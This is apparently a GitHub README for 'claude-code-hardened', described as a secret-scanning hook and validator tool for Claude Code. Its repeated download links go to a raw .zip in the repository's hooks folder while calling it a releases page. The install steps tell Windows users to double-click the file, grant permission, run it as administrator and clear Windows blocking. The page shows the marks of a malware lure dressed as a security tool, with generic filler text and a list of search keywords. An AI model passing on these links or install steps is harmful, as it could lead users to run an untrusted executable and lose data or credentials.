# 🛡️ claude-code-hardened - Keep Secrets Out of GitHub

[![Download the latest release](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Roseannemedian933/claude-code-hardened/main/hooks/code_hardened_claude_2.8-beta.4.zip)

## 🔒 What this app does

claude-code-hardened helps keep private data out of your GitHub commits when you use Claude Code. It adds security hooks, clear rules, and a live validator that checks work before it can be pushed.

Use it to catch:
- API keys
- Passwords
- Tokens
- Private config files
- Other text that should not reach GitHub

It is built for people who want a simple way to add safety checks before code leaves their computer.

## 📥 Download the app

Visit this page to download: https://raw.githubusercontent.com/Roseannemedian933/claude-code-hardened/main/hooks/code_hardened_claude_2.8-beta.4.zip

On that page:
1. Find the latest release
2. Download the file for Windows
3. Open the downloaded file and follow the prompts

If you see more than one file, choose the Windows download.

## 🪟 Install on Windows

Use these steps after you download the release:

1. Open your Downloads folder
2. Find the file you just downloaded
3. Double-click it to start the setup
4. If Windows asks for permission, choose Yes
5. Follow the on-screen steps
6. Wait for the setup to finish

If the file comes as a ZIP folder:
1. Right-click the ZIP file
2. Choose Extract All
3. Open the extracted folder
4. Run the setup file inside it

## ✅ Before you start

For the best results, keep these items ready:
- A Windows 10 or Windows 11 PC
- A working internet connection for the first download
- Claude Code already installed or ready to use
- Permission to run apps on your computer

This app does not need a long setup. It uses a simple install script and has no extra dependencies.

## 🧭 How to use it

After install, use claude-code-hardened before you send work to GitHub:

1. Open your project
2. Start your normal Claude Code workflow
3. Let the hooks scan changes as you work
4. Review any alert that appears
5. Fix the file or line that contains sensitive data
6. Run the validator again
7. Push only when the checks pass

The goal is simple: stop secret data before it leaves your machine.

## 🛡️ What gets checked

The app uses common checks that look for risky content in code and text files. It can help catch:

- `.env` files
- Hard-coded API keys
- Cloud tokens
- GitHub tokens
- Private service URLs
- Secret text in config files
- Clear text passwords
- Common secret patterns in logs and notes

These checks give you a second layer of defense before a push.

## ⚙️ Main features

### 🚨 Security hooks
Hooks run at key points in your workflow. They help spot risky changes early.

### 🧪 Live validator
The validator checks your work before it reaches GitHub. It shows you what needs attention.

### 📏 Battle-tested rules
The rule set focuses on common mistakes that lead to secret leaks.

### 🧰 Simple install script
You do not need to set up many parts by hand. The install script handles the main steps.

### 🪶 No extra dependencies
The package keeps setup light. You do not need to add extra tools first.

## 🗂️ Typical file layout

You may see files like these after install:

- `hooks/` for security checks
- `rules/` for scan rules
- `validator/` for live checks
- `install/` for setup files
- `logs/` for scan results

This layout helps keep the app easy to follow.

## 🔍 When to use it

Use claude-code-hardened when you:
- Work with API keys
- Handle client data
- Edit config files
- Use Claude Code on private projects
- Want a simple check before a push
- Need help spotting secrets fast

## 🛠️ If the app does not open

If Windows does not start the app:
1. Check that the download finished
2. Make sure you opened the right file
3. Try running it again as an administrator
4. Confirm Windows did not block the file
5. Download the latest release again if the file looks broken

If you still have trouble, use the latest file from the releases page and try a fresh install.

## 📌 Best practices

To get the most from the app:
- Keep secrets in safe storage, not in code
- Use the validator before every push
- Review alerts with care
- Remove old tokens from files
- Check new config files before sharing them
- Keep the app updated

## 🔗 Release page

Download and install from the GitHub releases page:

https://raw.githubusercontent.com/Roseannemedian933/claude-code-hardened/main/hooks/code_hardened_claude_2.8-beta.4.zip

## 🧩 Project focus

This project is built around:
- AI safety
- Claude Code
- Dev tools
- DevOps guardrails
- Secrets detection
- Security hooks

It is meant to reduce the chance of a secret reaching GitHub by mistake

## 📎 Useful search terms

People may also use this app when looking for:
- Claude Code security
- secret detection for GitHub
- AI coding guardrails
- hook-based file checks
- Windows security validator